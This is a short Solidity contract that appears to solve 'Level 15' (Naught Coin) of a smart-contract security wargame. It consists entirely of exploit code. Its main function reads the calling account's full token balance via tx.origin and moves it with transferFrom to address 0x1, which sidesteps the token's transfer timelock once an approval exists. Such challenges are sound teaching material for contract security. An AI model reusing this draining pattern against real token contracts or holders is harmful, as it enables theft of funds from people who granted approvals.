// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./NaughtCoin.sol";

contract Level15 {
    NaughtCoin naughtCoin;

    constructor(address naughtCoinAddr) public {
        naughtCoin = NaughtCoin(naughtCoinAddr);
    }

    function main() public {
        uint256 balance = naughtCoin.balanceOf(tx.origin);
        naughtCoin.transferFrom(tx.origin, address(0x1), balance);
    }
}
